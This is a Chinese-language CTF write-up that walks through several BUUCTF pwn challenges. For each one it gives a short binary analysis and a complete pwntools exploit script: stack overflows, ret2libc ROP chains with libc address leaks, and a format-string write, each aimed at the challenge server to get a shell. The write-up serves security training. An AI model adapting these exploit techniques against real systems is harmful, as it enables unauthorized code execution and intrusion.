# rip
根据IDA加载入main函数声明发现s数组距离`rbp`的距离为F，即为15，这里的运行环境是64位，所以应当将`Caller's rbp`的数据填满，在这里是8位，即可构造payload
```python
from pwn import *
p=remote("node4.buuoj.cn", 25401)
#p=process("./pwn1")
payload=b'a'*15+b'b'*8+p64(0x401186+1)
p.sendline(payload)
p.interactive()
```
# jarvisoj_level0
打开IDA主函数两条命令，很明显可利用漏洞就在`vulnerable_function`函数内，进入后看到buf很明显距离rbp有0x80位，再加上64位机多出来的8位，即覆盖`0x80+0x8`即可覆盖，另外有`callsystem`函数作为漏洞执行入口
```python
from pwn import *
p=remote("node4.buuoj.cn", 27716)
#p=process("./level0")
payload=b'a'*136+p64(0x400596)
#p.sendline(payload)
p.sendlineafter('Hello, World\n',payload)
p.interactive()
```

# ciscn_2019_c_1
首先获取程序的ROP信息`ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'`
![ROPinfo](https://image.0error.net/img/202220220610191811.png)
后面的具体操作见代码注释
```python
from pwn import *
from LibcSearcher import *
p=remote("node4.buuoj.cn", 27706)
#p=process("./ciscn_2019_c_1")
elf=ELF("./ciscn_2019_c_1")
main=0x400b28
rdi=0x400c83
ret=0x4006b9
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
p.sendlineafter('Input your choice!\n', '1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)#构造以输出puts_got的内容
p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
p.recvline()
p.recvline()
puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))#得到puts函数的地址
libc=LibcSearcher("puts", puts_addr)
libc_base=puts_addr-libc.dump("puts")
sys_addr=libc_base+libc.dump("system")
binsh=libc_base+libc.dump("str_bin_sh")#使用LibcSearcher找到对应的libc版本号
p.sendlineafter('choice!\n', '1')
#由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐，在这里可以使用ret进行栈对齐
payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)
#p.sendline(payload)
p.sendlineafter('encrypted\n',payload)
p.interactive()
```
经过暴力循环测试法，测得最终的libc版本为`libc6_2.27-0ubuntu3_amd64`，然后即可打通本poc  
# [第五空间2019 决赛]PWN5(格式化字符串)
试着运行一下先，发现当输入的长度比较长的时候，回显会出现一点问题，所以合理猜测输出语句存在问题。
![out](https://image.0error.net/img/202220220610204552.png)  
使用32位IDA载入，直接查看main函数
```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```
首先看了看栈溢出漏洞，read做了限制字符大小利用不了，但是看到了一个`printf(buf)`这就是一个明显的格式化字符漏洞，再结合题目分析一波，大概流程是随机生成一个数字存入到地址为`dword_804C044`的全局变量中，最后对输入的`passwd`字符进行比较，这里注意下`atoi`这个函数它只会提取正整数，除此之外都是返回0，因为`dword`变量是随机数，所以控制不了（之前见过一题也是随机数，但是它的随机种子在栈里面是可控的，然后用栈溢出，再引用`ctypes`库，加载`libc.so.6`然后就可以获得系统一样的随机数了），但是这题很明显就是通过`printf(buf)`这个漏洞去更改`dword`变量的值  
关于格式化字符串攻击，这里可以从以下两个资料着手了解  
[详谈Format String](https://www.cnblogs.com/0xJDchen/p/5904816.html)
[【整理笔记】格式化字符串漏洞梳理](https://sec.mrfan.xyz/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/)\
利用`AAAA %08x %08x %8x %08x %08x %08x %08x...`这样的字符串来找到我们输入的参数在函数栈上的位置\
假设是在栈中的第n位，则可利用`%n$`定位到参数在栈上的位置，特别值得一提的是，这里的%n中如果是n则默认只想ESP指向的栈顶的内容指向的内存地址，而如果是一个具体的数值x则是指向[ESP+x]\
因此在这道题中，我们就可以把我们不知道的`dword_804C044`改为我们设定的数值即可，由此编写poc
```python
from pwn import *

p = remote("node4.buuoj.cn", 28042)

addr=0x0804C044
payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
payload+=b'%10$n%11$n%12$n%13$n'
p.sendline(payload)
p.sendline(str(0x10101010))
p.interactive()
```
最终得到flag  
# ciscn_2019_n_8
打开之后查main函数逻辑，然后你就会发现原来是一道水题- -，只要保证var数组第14位为0x11即可getshell，直接什么都不看编写poc梭哈
```python
from pwn import *

p = remote("node4.buuoj.cn", 27097)

#addr=0x0804C044
payload=p32(0x11)*14
p.sendline(payload)
p.interactive()
```
梭哈成功✌
# jarvisoj_level2
IDA分析，`vulnerable_function`中有关于buf的read函数，且buf距离`ebp`长度为0x88，而read指定长度为0x100，再经过checksec查看，确认存在栈溢出漏洞。  
查看字符串发现程序内已经包含了`/bin/sh`字符串且具有system函数，因此溢出思路为填充buf跳转到system函数，然后传入字符串`/bin/sh`作为参数即可getshell，编写poc如下
```python
from pwn import *

p = remote("node4.buuoj.cn", 28037)

binsh=0x0804A024
system=0x8048320
payload=b'a'*(0x88+4)+p32(system)+b'a'*4+p32(binsh)
p.sendline(payload)
p.interactive()
```
成功打通，cat flag
# [OGeek2019]babyrop
初期逻辑和前面一道题比较像，buf给一个随机数，然后拿用户输入与buf进行比较，显然这里没有利用空间。
![main](https://image.0error.net/img/202220220611171440.png) 
![804871F](https://image.0error.net/img/202220220611171133.png) 
在sub_804871F函数里面很明显看到有`strlen(buf)`，这里有一个利用点，即strlen遇到`\x00`时直接截断，所以我们第一位直接截断即可绕过此部分，然后发现buf是一个7位数饿数组，但是在函数中有`read(0, buf, 0x20u)`，经计算，v5就相当于buf的第8位，所以v5在这里可以被我们指定。  
![](https://image.0error.net/img/202220220611171355.png)
而另一个函数sub_80487D0中a1就是main函数中传入的v5，buf的地址为[ebp-E7],如果v5为127，则会执行第一条代码，C8<E7,不能覆盖返回地址，v5需要尽可能的大，才能覆盖到返回地址。  
根据上述思路，进行exp编写，这里一开始是想在绕过之后利用read/write泄露地址然后通过LibcSearcher找到libc版本号的，但是发现不是很成功...通过泄露的地址未能找到正确的libc，结果回头一看题目里面已经给出libc了- -既然如此那就直接用了。真可谓众里寻他千百度，得来全不费工夫，最后把LibcSearcher的部分注释了，~~也算是一种复习吧~~
```python
from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn", 28820)
elf=ELF('./pwn1')
libc=ELF('./libc-2.23.so')

system_libc=libc.symbols['system']
binsh_libc=next(libc.search(b'/bin/sh'))
write_plt=elf.plt['write']
write_got=elf.got['write']
write_libc=libc.symbols['write']
read_got=elf.got['read']
read_plt=elf.plt['read']

main_addr=0x8048825

#payload1-截断strlen
payload1=b'\x00'+b'\xff'*7
p.sendline(payload1)
p.recvuntil("Correct\n")

#pay;pad2 - 泄露read的got地址
payload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)
#                        ret1          ret2
payload+=p32(1)+p32(write_got)+p32(4)
#write     par1     par2        par3
#write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数
p.sendline(payload)

write_addr=u32(p.recv(4))
print('[+]write_addr: ', hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置

# libc=LibcSearcher('read', read_addr)
# libc_base=read_addr-libc.dump('read')
# system_addr=libc_base+libc.dump('system')
# binsh_addr=libc_base+libc.dump('str_bin_sh')
libc_base=write_addr-write_libc
system_addr=system_libc+libc_base
binsh_addr=binsh_libc+libc_base

p.sendline(payload1)
p.recvuntil("Correct\n")

payload=b'a'*(0xe7+4)
payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址
p.sendline(payload)

p.interactive()
```